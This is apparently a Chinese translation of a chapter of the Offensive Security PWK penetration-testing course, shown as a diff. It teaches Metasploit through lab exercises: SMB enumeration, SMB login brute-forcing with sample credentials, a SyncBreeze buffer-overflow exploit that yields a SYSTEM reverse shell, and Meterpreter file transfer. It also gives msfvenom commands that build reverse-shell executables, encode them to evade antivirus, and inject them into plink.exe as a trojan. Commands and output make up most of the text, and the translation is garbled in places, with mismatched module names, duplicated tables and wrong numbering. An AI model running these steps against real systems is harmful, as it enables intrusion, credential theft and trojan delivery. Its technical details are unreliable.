+| scanner/smb/smb1 | normal | SMBv1 协议检测 |
+
+| scanner/smb/smb2 | normal | SMB 2.0 协议检测 |
+
+| scanner/smb/enumshares | normal | SMB 共享枚举 |
+
+| scanner/smb/enumusers | normal | SMB 用户枚举 (SAM 枚举器) |
+
+| scanner/smb/enumusers_domain | normal | SMB Domain用户枚举 |
+
+| scanner/smb/login | normal | SMB 登录扫描器 |
+
+| scanner/smb/lookupsid | normal | SMB 用户枚举 (LookUpSID) |
+
+| scanner/smb/ms17_01 | normal | MS17-01 SMB RCE 检测 |
+
+| scanner/smb/version | normal | SMB 版本检测 |
+
+列表 745 - 列出所有辅助模块
+
+我们可以使用 `search` 来减少这些大量的输出，通过应用、类型、平台等进行过滤。例如，我们可以通过 `search type:auxiliary name:smb` 搜索 SMB 辅助模块，如下列表所示。
+
+```
+msf5 > search -h
+Usage: search [ options ] <keywords>
+```
+
+# 使用 Kali Linux 2.0 进行渗透测试
+
+选项：
+
+`-h`
+
+`-o <file>`
+
+`-S <string>`
+
+显示此帮助信息
+
+将输出以 csv 格式发送到文件
+
+用于行过滤的搜索字符串
+
+- 关键字：
+
+  - `aka` 具有匹配别名（also-known-as）名称的模块
+
+  - `author` 由此作者编写的模块
+
+  - `arch` 影响此架构的模块
+
+  - `bid` 具有匹配 Bugtrag ID 的模块
+
+  - `cve` 具有匹配 CVE ID 的模块
+
+- `target` 影响此目标的模块
+
+  - `type` 特定类型的模块（利用程序、载荷、编码器、逃逸）
+
+示例：
+
+`search cve:2089 type:exploit`
+
+```
+msf5 > search type:auxiliary name:smb
+
+匹配的模块
+```
+
+| 名称 | 评级 | 描述 |
+
+|---|---|---|
+
+| auxiliary/admin/oracle/ora_ntl_stealer | normal | Oracle SMB 继攻击执行 |
+
+| auxiliary/admin/smb/check_dir_file | normal | SMB 扫描检查文件/目录 |
+
+| auxiliary/admin/smb/delete_file | normal | SMB 文件删除工具 |
+
+| auxiliary/admin/smb/download_file | normal | SMB 文件下载工具 |
+
+756 - 搜索 SMB 辅助模块
+
+在用 `use` 调用模块后，我们可以按照以下方式请求其更多信息：
+
+```
+msf5 > use scanner/smb/smb2
+msf5 auxiliary(scanner/smb/smb2) > info
+```
+
+> 名称: SMB 2.0 协议检测
+
+模块: auxiliary/scanner/smb/smb2
+
+许可证: Metasploit Framework 许可证 (BSD)
+
+评级: Normal
+
+提供者：
+
+hdm <xhdm.io>
+
+检查支持：
+
+是
+
+| 名称 | 当前设置 | 是否需要 | 描述 |
+
+|---|---|---|---|
+
+
+
+| `RHOSTS` | | 是 | 目标地址范围或 CIDR 标识符 |
+
+| `RPORT` | 445 | 是 | 目标端口 (TCP) |
+
+| `THREADS` | 1 | 是 | 并发线程数 |
+
+PWK 2.0
+
+版权 © Offensive Security Ltd. 版留所有权利。
+
+# OFFENSIVE SECURITY
+
+## 使用 Kali Linux 2.0 进行渗透测试
+
+描述：
+
+检测支持 SMB 2.0 协议的系统
+
+> 列表 747 - 显示 SMB 模块的信息
+
+`info` 输出的模块描述告诉我们，`smb2` 模块目的是检测远程机器是否支持 SMB 2.0 协议。可以通过执行 `show options` 命令检查模块的基本选项参数。对于此特定模块，我们需要设置目标的 IP 地址，在这里是我们的 Windows 10 机器。
+
+或者，由于我们已经扫描了 Windows 10 机器，可以在 Metasploit 数据库中搜索 TCP 端口 445 的主机 (`services -p 445`)，并额外结果添加到 `RHOSTS` (`-rhosts`)
+
+```
+msf5 auxiliary(scanner/smb_version) > services -p 445 --rhosts
+```
+
+服务
+
+======
+
+| 主机 | 端口 协议 | 名称 状态 | 信息 |
+
+|---|---|---|---|---|
+
+| 10.11.0.22 | 445 | tcp | microsoft-ds | 开启 | () |
+
+```
+RHOSTS => 10.11.0.22
+```
+
+```
+msf5 auxiliary(scanner/smb_version) >
+```
+
+> 列表 748 - 从利用程序加载 IP 地址
+
+配置好必需参数后，我们可以用 `run exploit` 启动模块：
+
+```
+msf5 auxiliary(scanner/smb_2) > run
+```
+
+[ [+] 10.11.0.22:445 - 10.11.0.22:100 支持 SMB 2 [方言 255] 已在线
+
+[+] 扫描了 1 个主机 (100% 完成)
+
+[+] 辅助模块执行完成
+
+> 列表 749 - 运行辅助模块
+
+根据该模块，远程计算机确实支持 SMB 版本 2。为了利用这一点，我们可以使用 `scanner/smb_login` 模块尝试对机器进行暴力破解登录。该模块和选项列表产生了以下内容：
+
+```
+msf5 auxiliary(scanner/smb_enum_domains) > use scanner/smb_login
+```
+
+```
+msf5 auxiliary(scanner/smb_login) > options
+```
+
+模块选项 (`auxiliary/smb_login`):
+
+| 名称 | 当前设置 | 是否需要 | 描述 |
+
+|---|---|---|---|
+
+| `ABORT_ON_LOCKOUT` | false | | 发生账户锁定时中止 |
+
+| `BLANK_PASSWORDS` | false | | | 为所有用户尝试空密码 |
+
+| `BRUTEFORCE_SPEED` | 5 | | 暴力破解速度，从 0 到 5 |
+
+| `DB_CREDS` | false | | | 存储在用户名/密码对 |
+
+| `DB_PASS` | false | | | 添加当前数据库中的所有密码 |
+
+| `DB_ALL_USERS` | false | | | 添加当前数据库中的所有用户 |
+
+| `DETECT_ANY_AUTH` | false | | | 检测接受认证的系统 |
+
+| `DETECT_ANY_DOMAIN` | false | | | 检测是否需要域 |
+
+| `PASS_FILE` | | | | 包含密码的文件，每行一个 |
+
+| `PRESER_DOMAINS` | true | | | 包含域的用户名 |
+
+| `Proxies` | false | | | 主机:端口代理链 |
+
+| `RECORD_GUEST` | false | | | 记录来宾登录 |
+
+| `RHOSTS` | | 是 | 规格的目标地址或 CIDR 标识符 |
+
+| `RPORT` | 445 | 是 | SMB 服务 (TCP) |
+
+| `SMBDomain` | | | | 用于认证的域 |
+
+| `SMBPass` | | | | 指定用户使用的密码 |
+
+| `SMBUser` | | | | 用于身份验证的用户名 |
+
+| `STOP_ON_SUCCESS` | false | | | 成功时停止 |
+
+| `THREADS` | 1 | 是 | 并发线程数 |
+
+| `USERPASS_FILE` | | | | 包含用户和密码的文件 |
+
+| `USER_AS_PASS` | false | | | 为所有用户尝试密码 |
+
+| `USER_FILE` | | | | 包含用户的文件，每行一个 |
+
+| `VERBOSE` | true | | | 是否输出所有尝试 |
+
+列表 750 - smb_login 的列表
+
+该输出接受参数（如 `RHOSTS`）和可选参数（如 `SMBDomain`）。注意，尽管我们在之前的 SMB 模块中设置了 `RHOSTS`，但该模块没有设置。它仅在运行的模块范围内设置。我们可以设置一个适用于所有模块的全局参数。
+
+可以更改的一个辅助参数是 `THREADS`。它告诉框架在运行模块时启动多少线程。我们不希望运行太快，但稍微增加会显著缩短时间。
+
+为了演示，假设我们已经发现了有效的凭据。我们想确定这些凭据是否可以在 TCP 端口 445 开启的服务器上重用。为了方便，我们将在无效密码的客户端尝试这种方法。我们将提供有效的域 `corp.com`、有效的用户名 (`Offsec`)、无效密码 (`ABCDEF23`) 以及 Windows 10 的 IP 地址：
+
+```
+msf5 auxiliary(scanner/smb_login) > set SMBDomain corp.com
+SMBDomain => corp.com
+
+msf5 auxiliary(scanner/smb_login) > set SMBUser Offsec
+SMBUser => Offsec
+
+msf5 auxiliary(scanner/smb_login) > set SMBPass ABCDEF23!
+SMBPass => ABCDEF23!
+
+msf5 auxiliary(scanner/smb_login) > set RHOSTS 10.11.0.22
+RHOSTS => 10.11.0.22
+```
+
+# OFFENSIVE SECURITY
+
+使用 Kali Linux 2.0 进行渗透测试
+
+```
+msf5 auxiliary(scanner/smb_login) > set THREADS 10
+THREADS => 10
+```
+
+```
+msf5 auxiliary(scanner/smb_login) > run
+```
+
+```
+[+] 10.11.0.22:445 - 10.11.0.22:445 - 开始 SMB 暴力登录
+[*] 10.11.0.22:445 - 10.11.0.22:445 - 该系统不接受认证
+[-] 10.11.0.22:445 - 10.11.0.22:445 - 失败: 'corp.com@Offsec:ABCDEF23!',
+[+] 扫描了 1 个主机 (100% 完成)
+[*] 辅助模块执行完成
+```
+
+列表 751 - 尝试 SMB 登录
+
+由于我们知道提供了密码，登录如预期失败了。现在，尝试提供一个有效密码并重新运行模块。
+
+```
+msf5 auxiliary(scanner/smb_login) > set SMBPass Querty09!
+SMBPass => Querty09!
+```
+
+```
+msf5 auxiliary(scanner/smb_login) > run
+```
+
+```
+[+] 10.11.0.22:445 - 10.11.0.22:445 - 开始 SMB 暴力登录
+[*] 10.11.0.22:445 - 10.11.0.22:445 - 该系统不接受认证
+[*] 10.11.0.22:445 - 10.11.0.22:445 - 成功: 'corp.com@Offsec:Querty09!'
+[+] 扫描了 1 个主机 (100% 完成)
+[*] 辅助模块执行完成
+```
+
+列表 752 - 使用有效凭据尝试 SMB 登录
+
+这次身份验证成功了。我们可以从凭据中检索成功的登录。
+
+```
+msf5 > creds
+Credentials==
+```
+
+| 主机 | 源 | 服务 | 公有 | 私有类型 |
+
+|---|---|---|---|
+
+| 10.11.0.22 | 10.11.0.22 | 445/tcp (microsoft-ds) | Offsec Querty09! | corp.com Password |
+
+列表 753 - 列出所有发现的凭据
+
+尽管这次运行成功，但它无法扩展。为了测试具有多种密码的用户群，可以使用 `USERPASS_FILE` 参数，它指示模块使用一个由空格分隔的用户密码的文件，每行一对。
+
+
+
+```
+msf5 auxiliary(scanner/smb_login) > set USERPASS_FILE /home/kali/users.txt
+USERPASS_FILE => /home/kali/users.txt
+```
+
+```
+msf5 auxiliary(scanner/smb_login) > run
+```
+
+```
+[+] 10.11.0.22:445 - 10.11.0.22:445 - 开始 SMB 暴力登录
+[-] 10.11.0.22:445 - 10.11.0.22:445 - 失败: '.\bob:querty09!',
+[-] 10.11.0.22:445 - 10.11.0.22:445 - 失败: '.\bob:password',
+[-] 10.11.0.22:445 - 10.11.0.22:445 - 失败: '.\alice:querty09!',
+[-] 10.11.0.22:445 - 10.11.0.22:445 - 失败: '.\alice:password',
+```
+
+# 使用 Kali Linux 2.0 进行渗透测试
+
+```
+[+] 10.11.0.22:445 - Success: '\offsec!Qwerty9'
+[*] 10.11.0.22:445 - Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+```
+
+### 列表 754 - 使用用户名和密码对 SMB 登录进行暴力破解
+
+让我们尝试另一个例子。在这个例子中，我们将尝试识别监听在 TCP 端口 3389 的机器，这可能表明它们运行着远程桌面协议 (RDP) 连接。为此，我们将调用 `scanner/rdp/rdp_scanner`。
+
+```
+msf5 auxiliary(scanner/smb_login) > use scanner/rdp/rdp_scanner
+```
+
+```
+msf5 auxiliary(scanner/rdp/rdp_scanner) > show options
+```
+
+模块选项 (`auxiliary/scanner/rdp/rdp_scanner`):
+
+| Name | Current Setting | Required | Description |
+|---|---|---|---|
+| CredSSP | true | yes | 是否请求 CredSSP |
+| EarlyUser | false | yes | 是否提供 Early User Authorization Re |
+| RHOSTS | | yes | 目标范围或 CIDR 标识符 |
+| RPORT | 3389 | yes | 目标端口 (TCP) |
+| THREADS | 1 | yes | 并发线程数 |
+| TLS | true | | 是否请求 TLS 安全 |
+
+```
+msf5 auxiliary(scanner/rdp/rdp_scanner) > set RHOSTS 10.11.0.22
+```
+
+```
+msf5 auxiliary(scanner/rdp/rdp_scanner) > run
+```
+
+```
+[+] 10.11.0.22:3389 - Detected RDP on 10.11.0.22:3389
+[*] 10.11.0.22:3389 - Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+```
+
+### 列表 755 - 识别远程桌面协议端点
+
+该模块成功检测到在一个主机上运行的 RDP，并自动将结果添加到数据库中。
+
+## 22.1.3.1 练习
+
+1. 启动 `postexpl` 并启动 `msfconsole`。
+2. 使用 SMB、HTTP 以及任何其他辅助模块扫描实验室系统。
+3. 在数据库中查看主机信息。
+
+## 22.2 利用模块
+
+现在我们已经熟悉了 MSF 的基本用法和几个辅助模块，让我们深入研究 MSF 的核心部分：利用模块（`exploit modules`）。
+
+利用模块通常包含针对漏洞应用程序和服务的利用代码。在本文期间，Metasploit 包含超过 1700 个漏洞，经过了精心开发和测试，能够成功利用各种漏洞服务。这些漏洞的调用方式与辅助模块相似。
+
+## 22.2.1 SyncBreeze Enterprise
+
+为了开始探索利用模块，我们将关注一个我们反复利用过的服务：SyncBreeze。在本节中，我们将在 Windows 10 工作站上搜索与 SyncBreeze 企业应用程序相关的漏洞，然后使用 MSF 对其利用。首先，我们使用 `search` 命令：
+
+```
+msf5 > search syncbreeze
+Matching Modules
+===========
+Name Disclosure Date Rank Description
+--- -------------------- ----- -----------------
+exploit/windows/fileformat/syncbreeze_xml 2017-03-29 normal Sync Breeze Enterprise 9.5.16 -- Import Command Buffer Overflow
+exploit/windows/http/syncbreeze_b 2017-03-15 great Sync Breeze Enterprise GET Buffer Overflow
+```
+
+输出显示了两个特定的利用模块。我们将关注 10.0.28 并请求该特定模块的 `info` 信息：
+
+```
+msf5 > info exploit/windows/http/syncbreeze_b
+Name: Sync Breeze Enterprise GET Buffer Overflow
+Module: exploit/windows/http/syncbreeze_bof
+Platform: Windows
+Arch:
+Privileged: Yes
+License: Metasploit Framework License (BSD)
+Rank: Great
+Disclosed: 2017-03-15
+```
+
+提供者：
+
+- Daniel Teixeira
+- Andrew Smith
+- Owais Mehtab
+- Milton Valencia (wetwork)
+
+可用目标：
+
+| Id | Name |
+|---|---|
+| 0 | Automatic |
+| 1 | Sync Breeze Enterprise v9.4.28 |
+| 2 | Sync Breeze Enterprise v10.0.28 |
+| 3 | Sync Breeze Enterprise v10.1.16 |
+
+基础选项：
+
+| Name | Current Setting | Description |
+|---|---|---|
+| Proxies | no | 代理链格式类型为：host[:port],type:hos |
+| RHOST | yes | 目标地址 |
+| RPORT | 80 | yes | 目标端口 (TCP) |
+| SSL | false | no | 为出站连接协商 SSL/TLS |
+| VHOST | no | HTTP 服务器虚拟主机 |
+
+Payload 信息 信息：
+
+Space: 500
+
+Avoid: 6 characters
+
+描述：
+
+该模块利用了 Sync Breeze Enterprise v9.4.28、v10.0.28 和 v10.1.56 界面中的栈缓冲区溢出漏洞。该漏洞是由于向内置 Web 服务器发送 HTTP GET 和 POST 请求时对请求的边界检查不当导致的。
+
+## 使用 Kali Linux 2.0 进行渗透测试
+
+| Name | Current Setting | Required | Description |
+|---|---|---|---|
+| CredSSP | true | yes | 是否请求 CredSSP |
+| EarlyUser | false | yes | 是否提供 Early User Authorization Re |
+| RHOSTS | | yes | 目标范围或 CIDR 标识符 |
+| RPORT | 3389 | yes | 目标端口 (TCP) |
+| THREADS | 1 | yes | 并发线程数 |
+| TLS | true | | 是否请求 TLS 安全 |
+| VHOST | no | HTTP 服务器虚拟主机 |
+
+Payload 信息：
+
+Space: 500
+
+Avoid: 6 characters
+
+描述：
+
+该模块利用了 Sync Breeze Enterprise v9.4.28、v10.0.28 和 v10.1.56 界面中的栈缓冲区溢出漏洞。该漏洞是由于向内置 Web 服务器发送 HTTP GET 和 POST 请求时对请求的边界检查不当导致的。
+
+
+
+# 使用 Kali Linux 进行渗透测试 2.0
+
+![](img/f99f528ca9845f4c256ce54e882b1345_691_0.png)
+
++ [*] 在 `10.11.0.4:4444` 上启动反向 TCP 处理器
+[*] 正在自动检测目标...
+[*] 目标是 `10.0.28`
+[*] 正在发送请求...
+[*] shell 会话已打开 `1` (`10.11.0.4:4444` -> `10.11.0.22:50195`)
+
+Microsoft Windows [版本 10.0.16299.248]
+
+(2017) Microsoft Corporation 保留所有。
+
+```
+C:\Windows\system32> whoami
+whoami
+nt authority\system
+```
+
+列出正在执行的利用程序
+
+注意当我们执行利用程序时，Metasploit 会自动创建一个负载监听器（`listener`），而不再需要 Netcat。执行完成后，将创建一个会话，我们就可以使用反向 shell。
+
+## 2.2.1.1 练习
+
+- 1. 使用现有的 Metasploit 模块利用 SyncBreeze。
+
+## 22.3 Metasploit 负载
+
+到目前为止，我们只利用了 `windows/reverse_tcp`，这是一种简单且独立的反向 shell。Metasploit 包含了除了基本 shell 之外的许多其他类型的负载。让我们现在一些。
+
+## 2.2.3.1 分阶段（Staged）与非分阶段（Non-Staged）负载
+
+在深入研究特定的 shellcode 功能之前，我们必须区分分阶段和非分阶段 shellcode 之间的区别，这从这两种负载的描述中可以看出：
+
+```
+windows/reverse_tcp 连接回攻击者并产生命令 shell
+windows/reverse_tcp 连接回攻击者，产生 cmd (分阶段的)
+```
+
+列表 763 - 分阶段和非分阶段负载的语法
+
+负载之间的区别是细微的。非分阶段负载会随着利用程序完整地发送。相比之下，分阶段负载分两部分发送。第一部分包含一个小型负载，它让受害者连接回攻击者，传输一个包含剩余 shellcode 的较大的次级负载，然后执行它。
+
+在某些情况下，我们更倾向于使用分阶段 shellcode 而不是全分阶段的，如果我们利用的漏洞没有足够的缓冲区来容纳完整负载，那么分阶段负载可能是合适的。由于分阶段负载的第一部分比完整负载小，这些较小的初始负载可以帮助我们应对空间受限的情况。此外，我们需要记住，防病毒软件经常检测到利用程序中嵌入的 shellcode。通过将该代码替换为分阶段负载，我们移除了 shellcode 中很大一部分恶意部分，这可能会增加我们的成功几率。在利用程序执行初始阶段后，剩余的负载将被检索并直接注入到受害者的内存中。
+
+PWK 2.0
+
+Copyright © Offensive Security Ltd. 保留所有。
+
+692
+
+# 使用 Kali Linux 进行渗透测试 2.0
+
+注意在 Metasploit 中，`/ " ` 字符用于标记负载是否是分阶段的，因此 `"windows/reverse_tcp"` 不是分阶段的，而 `"windows/shell/reverse_tcp"` 是。
+
+## 22.3.2 Meterpreter 负载
+
+如 Metasploit 网站所述，Meterpreter 是一种可以在运行时动态扩展的多功能负载。通过这种方式，Meterpreter 提供了比普通命令 shell 更多的特性和功能，提供了如文件传输、按键记录和其他与受害者机器交互的方法。这些工具在后渗透阶段特别有用。由于 Meterpreter 的灵活性和能力，它是最受喜和最常用的 Metasploit 负载。
+
+搜索 `"meterpreter"` 会返回一长串结果，但导航到负载类别，可以发现适用于多个操作系统和架构的 meterpreter，包括 Windows、Linux、Android、Apple iOS、FreeBSD 和 Apple OS X/macOS。
+
+```
+msf5 > search meterpreter type:payload
+匹配的模块
+```
+
+| 名称 | 描述 |
+|---|---|
+| 1 | payload/android/meterpreter/reverse_http | Android Meterpreter, Android |
+| 2 | payload/android/meterpreter/reverse_https | Android Meterpreter, Android |
+| 3 | payload/android/meterpreter/reverse_tcp | Android Meterpreter, Android |
+| 4 | payload/android/meterpreter/reverse_http | Android Meterpreter, Shell |
+| 5 | payload/android/meterpreter/reverse_https | Android Meterpreter, Shell |
+| 6 | payload/android/meterpreter/reverse_tcp | Android Meterpreter, Shell |
+| 7 | payload/ios/aarch64/meterpreter/reverse_http | Apple_iOS Meterpreter |
+| 8 | payload/ios/aarch64/meterpreter/reverse_https | Apple_iOS Meterpreter |
+| 9 | payload/ios/aarch64/meterpreter/reverse_tcp | Apple_iOS Meterpreter |
+| 10 | payload/ios/arm/meterpreter/reverse_http | Apple_iOS Meterpreter |
+
+列表 764 - Meterpreter 负载
+
+有多个 Meterpreter 版本基于特定的编程语言（Python, PHP, Java）、协议（UDP, HTTPS, IPv6）和其他规范（32 位、分阶段与非分阶段）。例如，反 meterpreter 负载的选择所示：
+
+```
+payload/windows/meterpreter/reverse_udp Reverse Stager
+payload/windows/meterpreter/reverse_http Windows Stager
+payload/windows/meterpreter/reverse_https Windows Stager
+payload/windows/meterpreter/reverse_ipv6_tcp Reverse Stager (IPv6)
+payload/windows/meterpreter/reverse_tcp Reverse Stager
+```
+
+列表 765 - Meterpreter 协议
+
+https://github.com/rapid/metasploit-framework/wiki/Meterpreter
+
+PWK 2.0 © Offensive Security Ltd. 保留所有。
+
+693
+
+OFFENSIVE SECURITY
+
+可以使用 `set` 选择特定的 meterpreter 负载并像标准反向 shell 那样配置它：
+
+```
+msf5 exploit(windows/http_handler) > set payload windows/meterpreter/reverse_http
+payload => windows/meterpreter/reverse_http
+msf5 exploit(windows/http_handler) > set LHOST 10.11.0.4
+LHOST => 10.11.0.4
+msf5 exploit(windows/http_handler) > show options
+```
+
+负载 (`windows/meterpreter/reverse_http`):
+
+| 名称 | 当前设置 | 需要 | 描述 |
+|---|---|---|---|
+| EXITFUNC | | | 退出技术 |
+| LHOST | 10.11.0.4 | 是 | 监听器主机名 |
+| LPORT | 4444 | 是 | 监听端口 |
+| LURI | | 否 | HTTP 路径 |
+
+列表 766 - 选择 meterpreter 负载并配置选项
+
+让我们同步尝试此负载。配置好一切后，我们可以启动利用程序并建立反向 meterpreter 连接：
+
+
+
+```
+msf5 exploit(windows/http_handler) > exploit
+[*] 在 http://10.11.0.4:4444 上启动 HTTP 处理器
+[*] 正在自动检测目标...
+[*] 目标是 10.0.28
+[*] 正在发送请求...
+[*] http://10.11.0.4:4444 处理来自 10.11.0.22 的请求；UUID: pchowbz) 分阶段
+[*] Meterpreter 会话 1 已打开 (10.11.0.4:4444) -> 10.11.0.22:50270
+meterpreter >
+```
+
+列表 757 - 建立反向 meterpreter 连接
+
+所示所示`meterpreter`负载的语法与我们看到的其他负载匹配。让我们进一步研究 Meterpreter 以突出一些显著的差异。
+
+## 22.3.3 实验 Meterpreter
+
+我们可以使用 `help` 命令获取 Meterpreter 内置的所有模块和命令列表：
+
+```
+meterpreter > help
+```
+
+### 核心命令
+
+| 命令 | 描述 |
+| --- | --- |
+| ? | 帮助菜单 |
+| background | 将当前会话后台化 |
+| bgkill | 杀死后台 meterpreter 脚本 |
+| bglist | 列出运行的后台脚本 |
+| bgrun | 作为后台线程执行 meterpreter 脚本 |
+| channel | 显示信息或控制活动通道 |
+| close | 关闭通道 |
+| disable_unicode_encoding | 禁用 unicode 字符串编码 |
+| enable_unicode_encoding | 启用 unicode 字符串编码 |
+| exit | meterpreter 会话 |
+| get_timeouts | 获取当前会话超时值 |
+| guid | 获取会话 GUID |
+
+列表 768 - Meterpreter 的帮助命令
+
+了解 Meterpreter 特性的最佳方法是测试它们。让我们从 `sysinfo` 和 `getuid` 等几个简单命令开始。
+
+```
+meterpreter > sysinfo
+Computer : CLIENT251
+OS : Windows 10 (Build 16299)
+Architecture : x86
+System Language : en_US
+Domain : corp
+Logged On Users : 7
+Meterpreter : x86/windows
+
+meterpreter > getuid
+Server username: NT AUTHORITY\SYSTEM
+```
+
+列表 769 - 在 meterpreter 中执行简单命令
+
+引入的命令为我们提供了有关目标计算机、操作系统和当前用户的信息。接下来，让我们使用内置的 meterpreter 命令尝试一些上传。注意，由于 shell 转义，我们对目标路径使用双引号 `""`，如下所示：
+
+```
+meterpreter > upload /usr/share/windows-resources/binaries/bin.exe ""C:\Users\Offsec""
+[*] 正在上传：/usr/share/windows-resources/binaries/bin.exe -> C:\Users\Offsec.exe
+[*] 已上传：/usr/share/windows-resources/binaries/bin.exe -> C:\Users\Offsec.exe
+
+meterpreter > download c:\Windows\system32\calc.exe /tmp/calc.exe
+[*] 正在下载：c:\Windows\system32\calc.exe -> /tmp/calc.exe
+[*] 已下载 25.50 KiB (100.0%) : c:\Windows\system32 -> /tmp/calc.exe
+[*] 下载：c:\Windows\system32\calc.exe -> /tmp/calc.exe
+meterpreter >
+```
+
+列表 770 - 使用 meterpreter 上传和下载文件
+
+Meterpreter 包含了基础文件系统命令，如 `pwd`、`ls` 和 `cd`，用于遍历目标文件系统。每个命令的名称与 Linux 上使用的相同，但通过 Meterpreter 在 Windows 宿主机上运行。从 Meterpreter 产生系统 shell 的最大优势是，如果由于某种原因我们的 shell 无法退出（例如，在 shell 中启动了交互式会话且未退出），我们可以退出 shell 返回 Meterpreter 并在新通道中重新生成，如列表 771 所示。
+
+```
+meterpreter > shell
+Process 3488 created.
+Channel 3 created.
+
+C:\Windows\system32> ftp 127.0.0.1
+ftp 127.0.0.1
+ftp: connect :Connection refused
+^C
+
+Terminate channel 3? [Y/n] y
+
+meterpreter > shell
+Process 3504 created.
+Channel 4 created.
+
+C:\Windows\system32> exit
+exit
+meterpreter >
+```
+
+> 列表 771 - 在 meterpreter 中使用 shell 命令
+
+虽然可以从 `shell` 命令打开的命令行提示符执行应用程序，但我们也可以使用内置的 meterpreter 命令。例如，`execute` 命令启动应用程序，`ps` 列出所有运行的进程，而 `kill` 则终止指定的进程。
+
+虽然 Metploit 的签名负载（payload）包含许多优秀功能，但它不是唯一的可用负载。还有其他适用于特定情况的负载，例如 `vncinject/reverse_http`，它会创建一个反向 VNC 图形连接；或者 `php/reverse_php`，它是一个完全用 PHP 编写的反向 shell，可用于利用 PHP Web 应用程序。存在更奇特的负载，如 `mainframe/reverse_shell_jcl`，它是针对 Z/OS 主机的反向 shellcode。
+
+## 22.3.3 练习
+
+- 1) 花些时间查看并实验 Metploit 中可用的各种负载。
+
+### 22.3.4 可执行载荷
+
+Metploit Framework 载荷可以导出为各种文件类型和格式，如 ASP、VScript、Jar、Windows DLL 和 EXE 等。
+
+713 https://en.wikipedia.org/wiki/Virtual_Network_Computing
+
+714 https://en.wikipedia.org/wiki/Z/OS
+
+# 使用 Kali Linux 2.0 进行渗透测试
+
+例如，让我们使用 `-p` 标志设置负载，使用 `LHOST` 和 `LPORT` 分配监听的可执行文件。我们将使用 `-h` 指定主机，使用 `-f` 指定输出格式（在此例为 exe），并使用 `-o` 指定文件名：
+
+```
+kali@kali:~ msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443 -f exe -o
+shell_reverse.exe
+```
+
+[-] No payload was selected, choosing Msf:Module:Windows from the payload
+
+[-] No arch selected, selecting arch: x86 from the payload
+
+No encoder or encoders specified, output raw payload
+
+Payload size: 324 bytes
+
+Final size of exe: 73802 bytes
+
+Saved as: shell_reverse.exe
+
+```
+kali@kali:~ file_reverse.exe (GUI) Int for MS Windows
+shell_reverse.exe: PE32 executable
+```
+
+列表 772 - 创建带有反向 shell 载荷的可执行文件
+
+嵌入在 PE 文件中的 shell 可以使用许多 MSF 编码器中的任何一个进行编码。在历史上，这可以规避杀毒软件，但对于现代杀毒引擎已不再如此。编码通过 `-e` 配置以指定编码器类型，通过 `-i` 设置所需的编码迭代次数。我们可以使用多个编码器来进一步混淆二进制文件，从而有效地规避签名检测。
+
+
+
+```
+kali@kali:~ msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443 -f exe
+x86/shikata_ga_nai -i 9 -o shell_reverse_msf_encoded.exe
+[-] No payload was selected, choosing Msf:Module:Windows from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+Found 1 compatible encoder:
+Attempting to encode payload with 9 iterations of x86/shikata_ga_nai
+x86/shikata_ga_nai succeeded with size 351 (iteration=0)
+x86/shikata_ga_nai succeeded with size 378 (iteration=1)
+x86/shikata_ga_nai succeeded with size 405 (iteration=2)
+x86/shikata_ga_nai succeeded with size 432 (iteration=3)
+x86/shikata_ga_nai succeeded with size 459 (iteration=4)
+x86/shikata_ga_nai succeeded with size 486 (iteration=5)
+x86/shikata_ga_nai succeeded with size 513 (iteration=6)
+x86/shikata_ga_nai succeeded with size 540 (iteration=7)
+x86/shikata_ga_nai succeeded with size 567 (iteration=8)
+Payload size: 567 bytes
+Final size of exe: 73802 bytes
+Saved as: shell_reverse_msf_encoded.exe
+```
+
+## 列表 773 - 编码反向 shell 载荷
+
+`Metploit`的另一个有用功能是将负载注入到现有的 PE 文件中，这可能会进一步被 AV 检测的概率。注入通过 `-x` 标志指定要注入的文件完成。715 Rapid7,https://github.com/rapid7/metasploit-framework/wiki/How-to-use-msfvenom
+
+```
+kali@kali:~ msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443 -f exe -e
+x86/shikata_ga_nai -i 9 -x /usr/share/windows-resources/binaries/plink.exe -o shell_reverse_msf_encoded_embedded.exe
+```
+
+- No payload was selected, choosing Msf::Platform::Windows from the payload
+- No arch selected, selecting arch: x86 from the payload
+Found 1 compatible encoders
+Attempting to encode payload with 9 iterations of x86/shikata_ga_nai
+x86/shikata_ga_nai succeeded with size 351 (iteration=0)
+x86/shikata_ga_nai succeeded with size 378 (iteration=1)
+x86/shikata_ga_nai succeeded with size 405 (iteration=2)
+x86/shikata_ga_nai succeeded with size 432 (iteration=3)
+x86/shikata_ga_nai succeeded with size 459 (iteration=4)
+x86/shikata_ga_nai succeeded with size 486 (iteration=5)
+x86/shikata_ga_nai succeeded with size 513 (iteration=6)
+x86/shikata_ga_nai succeeded with size 540 (iteration=7)
+x86/shikata_ga_nai succeeded with size 567 (iteration=8)
+x86/shikata_ga_nai chosen with final size 567
+Payload size: 567 bytes
+Final size of exe: 31296 bytes
+Saved as: shell_reverse_msf_encoded_embedded.exe
+
+这些载荷可以用于客户端攻击、后门，或独立将负载从一台机器获取到另一台机器。当不知用户执行带有我们注入负载的二进制文件时，从用户的角度来看它将正常运行。在后台，注入的负载将尝试连接回我们等待的监听器。一个鲜为人知的秘密是此过程也可以通过 `msfconsole` 命令完成。例如，我们可以执行以下操作来重建之前的 `msfvenom` 示例。
+
+```
+msf > use payload/windows/shell_reverse_tcp
+
+msf payload(windows/shell_reverse_tcp) > LHOST 10.11.0.4
+
+HOST => 10.11.0.4
+
+msf payload(windows/shell_reverse_tcp) > LPORT 443
+
+PORT => 443
+
+msf payload(windows/shell_reverse_tcp) > generate -f exe -e x86/shikata_ga_nai -i 9
+
+-x /usr/share/windows-resources/binaries/plink.exe -o shell_reverse_msf_encoded_embedded.dex
+
+[*] Writing 311296 bytes to shell_reverse_msf_encoded_embedded.exe...
+```
+
+### 22.3.5 Metploit exploit Multi Handler
+
+在之前的模块中，我们使用 `Netcat` 来捕捉标准的反向 shell，例如由 `windows/shell_reverse_tcp` 负载生成的那些。然而，这种方法非常优雅，并且可能适用于更高级的 `Metploit` 负载。相反，使用框架的 `multi/handler` 模块，它适用于所有单阶段和多阶段负载。
+
+# 使用 Kali Linux 2.0 进行渗透测试
+
